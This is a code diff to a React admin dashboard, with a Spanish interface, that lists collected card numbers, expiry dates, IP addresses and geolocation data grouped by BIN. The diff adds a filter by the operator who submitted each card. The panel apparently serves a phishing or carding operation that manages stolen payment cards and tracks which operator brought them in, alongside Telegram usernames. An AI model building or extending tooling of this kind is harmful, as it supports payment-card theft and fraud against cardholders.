@@ -10,6 +10,7 @@ interface CardRecord {
     expiry: string | null;
     ipAddress: string | null;
     ipInfo: Record<string, string> | null;
+    submittedBy: string | null;
     createdAt: string;
 }
 
@@ -36,6 +37,9 @@ export default function Dashboard() {
     const [users, setUsers] = useState<UserRecord[]>([]);
     const [loading, setLoading] = useState(true);
     const [search, setSearch] = useState('');
+
+    // Card user filter
+    const [userFilter, setUserFilter] = useState('');
 
     // Telegram usernames
     const [tgAvailable, setTgAvailable] = useState<string[]>([]);
@@ -64,16 +68,30 @@ export default function Dashboard() {
             .finally(() => setLoading(false));
     }, [token, logout]);
 
+    // Get unique submitters for filter dropdown
+    const submitters = useMemo(() => {
+        const set = new Set<string>();
+        cards.forEach((c) => { if (c.submittedBy) set.add(c.submittedBy); });
+        return Array.from(set).sort();
+    }, [cards]);
+
     const filtered = useMemo(() => {
-        if (!search) return cards;
-        const s = search.toLowerCase();
-        return cards.filter(
-            (c) =>
-                c.cardNumber?.toLowerCase().includes(s) ||
-                c.ipAddress?.toLowerCase().includes(s) ||
-                c.expiry?.toLowerCase().includes(s),
-        );
-    }, [cards, search]);
+        let result = cards;
+        if (userFilter) {
+            result = result.filter((c) => c.submittedBy === userFilter);
+        }
+        if (search) {
+            const s = search.toLowerCase();
+            result = result.filter(
+                (c) =>
+                    c.cardNumber?.toLowerCase().includes(s) ||
+                    c.ipAddress?.toLowerCase().includes(s) ||
+                    c.expiry?.toLowerCase().includes(s) ||
+                    c.submittedBy?.toLowerCase().includes(s),
+            );
+        }
+        return result;
+    }, [cards, search, userFilter]);
 
     const filteredUsers = useMemo(() => {
         if (!search) return users;
@@ -131,7 +149,7 @@ export default function Dashboard() {
     };
 
     const getSearchPlaceholder = () => {
-        if (tab === 'cards') return 'Buscar por número, IP...';
+        if (tab === 'cards') return 'Buscar por número, IP, usuario...';
         if (tab === 'users') return 'Buscar usuario, telegram, IP...';
         return 'Buscar telegram username...';
     };
@@ -162,7 +180,7 @@ export default function Dashboard() {
             </div>
 
             <div className="dash-tabs">
-                <button className={`dash-tab${tab === 'cards' ? ' active' : ''}`} onClick={() => { setTab('cards'); setSearch(''); }}>
+                <button className={`dash-tab${tab === 'cards' ? ' active' : ''}`} onClick={() => { setTab('cards'); setSearch(''); setUserFilter(''); }}>
                     <i className="fas fa-credit-card" /> Tarjetas
                 </button>
                 <button className={`dash-tab${tab === 'users' ? ' active' : ''}`} onClick={() => { setTab('users'); setSearch(''); }}>
@@ -172,6 +190,32 @@ export default function Dashboard() {
                     <i className="fab fa-telegram-plane" /> Telegram Usernames
                 </button>
             </div>
+
+            {/* User filter for cards tab */}
+            {tab === 'cards' && submitters.length > 0 && (
+                <div className="card-user-filter">
+                    <div className="filter-label">
+                        <i className="fas fa-filter" /> Filtrar por usuario:
+                    </div>
+                    <div className="filter-options">
+                        <button
+                            className={`filter-chip${!userFilter ? ' active' : ''}`}
+                            onClick={() => setUserFilter('')}
+                        >
+                            Todos
+                        </button>
+                        {submitters.map((u) => (
+                            <button
+                                key={u}
+                                className={`filter-chip${userFilter === u ? ' active' : ''}`}
+                                onClick={() => setUserFilter(u)}
+                            >
+                                <i className="fas fa-user" /> {u}
+                            </button>
+                        ))}
+                    </div>
+                </div>
+            )}
 
             <div className="stats-row">
                 {tab === 'cards' ? (
@@ -184,6 +228,12 @@ export default function Dashboard() {
                             <div className="label">BINs Únicos</div>
                             <div className="value">{binGroups.length}</div>
                         </div>
+                        {userFilter && (
+                            <div className="stat-card">
+                                <div className="label">Filtrado por</div>
+                                <div className="value" style={{ fontSize: '1rem', color: '#38bdf8' }}>{userFilter}</div>
+                            </div>
+                        )}
                     </>
                 ) : tab === 'users' ? (
                     <>
@@ -223,29 +273,44 @@ export default function Dashboard() {
                 binGroups.length === 0 ? (
                     <div className="empty-state">
                         <i className="fas fa-database" />
-                        <p>{search ? 'No se encontraron resultados' : 'No hay tarjetas registradas'}</p>
+                        <p>{search || userFilter ? 'No se encontraron resultados' : 'No hay tarjetas registradas'}</p>
                     </div>
                 ) : (
                     <div className="bin-groups-container">
-                        {binGroups.map((g) => (
-                            <Link key={g.bin} to={`/admin/bin/${g.bin}`} className="bin-group-link">
-                                <div className="bin-group">
-                                    <div className="bin-group-header">
-                                        <div className="bin-group-header-left">
-                                            <div className="bin-group-icon"><i className="fas fa-credit-card" /></div>
-                                            <div className="bin-group-info">
-                                                <div className="bin-group-title">
-                                                    BIN: <span className="bin-label">{g.bin}</span>
-                                                    <span className="bin-group-badge"><i className="fas fa-layer-group" /> {g.count}</span>
+                        {binGroups.map((g) => {
+                            // Count unique submitters for this BIN group
+                            const groupCards = filtered.filter(
+                                (c) => (c.cardNumber?.replace(/\s/g, '').slice(0, 6) || 'UNKNOWN') === g.bin,
+                            );
+                            const groupSubmitters = new Set(groupCards.map((c) => c.submittedBy).filter(Boolean));
+
+                            return (
+                                <Link key={g.bin} to={`/admin/bin/${g.bin}`} className="bin-group-link">
+                                    <div className="bin-group">
+                                        <div className="bin-group-header">
+                                            <div className="bin-group-header-left">
+                                                <div className="bin-group-icon"><i className="fas fa-credit-card" /></div>
+                                                <div className="bin-group-info">
+                                                    <div className="bin-group-title">
+                                                        BIN: <span className="bin-label">{g.bin}</span>
+                                                        <span className="bin-group-badge"><i className="fas fa-layer-group" /> {g.count}</span>
+                                                    </div>
+                                                    <div className="bin-group-meta">
+                                                        Última: {new Date(g.latest).toLocaleString()}
+                                                        {groupSubmitters.size > 0 && (
+                                                            <span className="bin-submitters">
+                                                                {' · '}<i className="fas fa-user" /> {Array.from(groupSubmitters).join(', ')}
+                                                            </span>
+                                                        )}
+                                                    </div>
                                                 </div>
-                                                <div className="bin-group-meta">Última: {new Date(g.latest).toLocaleString()}</div>
                                             </div>
+                                            <div className="bin-group-arrow"><i className="fas fa-chevron-right" /></div>
                                         </div>
-                                        <div className="bin-group-arrow"><i className="fas fa-chevron-right" /></div>
                                     </div>
-                                </div>
-                            </Link>
-                        ))}
+                                </Link>
+                            );
+                        })}
                     </div>
                 )
             ) : tab === 'users' ? (
